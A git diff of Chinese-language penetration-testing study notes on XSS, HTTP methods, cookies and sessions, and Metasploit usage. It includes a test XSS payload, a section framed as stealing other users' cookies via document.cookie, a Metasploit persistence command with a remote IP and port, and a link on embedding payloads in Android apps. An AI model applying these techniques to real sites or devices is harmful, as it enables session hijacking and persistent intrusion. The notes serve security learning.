@@ -116,10 +116,11 @@
 
 4. 補充: NoSQL注入
 
-## XSS漏洞原理
+## XSS漏洞-跨站腳本漏洞
 
-1. 甚麼事XSS
+1. 甚麼是XSS
     - XSS(Cross Site Script)跨站腳本攻擊，網頁內嵌入HTML、CSS、JS代碼
+    - 惡意攻擊者利用web頁面的漏洞，插入一些惡意代碼，當用戶訪問頁面的時候，代碼會被執行達到攻擊的目的
 
 2. XSS類型
     - 反射型: 前端-> 後端 -> 前端
@@ -129,6 +130,50 @@
 3. XSS舉例:
     - 再輸入框輸入 ```<script>alert(1)</script>```
     - 進階: 綁定Beef轉換成監聽木馬
+
+### http 請求方式
+#### 常用
+- GET: 請求伺服器獲取資源
+- HEAD: 類似GET，但不會返回實體數據，只會獲取回報頭(header)
+- POST: 向伺服器提交數據
+- PUT: 替換伺服器內容
+
+#### 不常用
+- DELETE: 請求伺服器刪除指定的資源
+- TRACE: 對鏈結路進行診斷測試
+- OPTIONS: 列出可對資源實行的操作方式，Allow字段裡返回
+- CONNECT: 請求伺服器與另一台伺服器建立連接，充當代理
+
+#### 擴展
+- MKCOL、COPY、MOVE、UNLOCK、PATCH
+
+### http特點
+- 請求(request)/應答(response)模式
+- 靈活可擴展
+- 可靠傳輸: TCP/IP 傳輸
+- 無狀態(stateless)
+
+### 客戶端 Cookie 特性
+1. 明文
+2. 可修改
+3. 大小受限 (視瀏覽器而定)
+4. 不能跨域名使用
+
+### 伺服器端 Session
+- 基於cookie 將資料儲存至Session中，透過獲取sessionID後，將資料回傳
+
+### Javascripts 操作 cookie
+1. 如何遠程獲取其他用戶的cookie
+    #### Javascripts語法:
+    - 獲取: document.cookie
+    - 設置: document.cookie = "(key=value)"
+    - 修改: document.cookie = "(key=new value)"
+    - 刪除:
+
+    #### 腳本注入網頁 XSS
+
+
+
 
 ## CSRF漏洞原理
 
@@ -164,7 +209,7 @@
 1. 甚麼是SSRF
     - SSRF(Server-Side Request Forgery)服務端請求偽造    
 
-## 參考資料
+### 參考資料
 - https://www.youtube.com/playlist?list=PLgZqc0esdeS-NJms7NYexeMHKLpfAi5HY
 
 # Metasploit
@@ -249,7 +294,7 @@ run persistence -X -i 5 -p 4444 -r (ip)
 - sessions: 觀看當前有多少電腦啟用程序
 
 
-## 參考資料: 
+### 參考資料: 
 - https://www.youtube.com/playlist?list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5
 
 - android 14+ apk綑綁: https://medium.com/@elijahchimera01/embedding-metasploit-payloads-into-legit-android-apps-ad75ab6199c6
@@ -266,4 +311,8 @@ run persistence -X -i 5 -p 4444 -r (ip)
 ### stage & stager
 - https://www.youtube.com/watch?v=F1EmVLmDIcc&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=21
 
-
+### 後滲透 (Post)
+- 必須已滲透後執行的指令
+```cmd
+run (post module)
+```
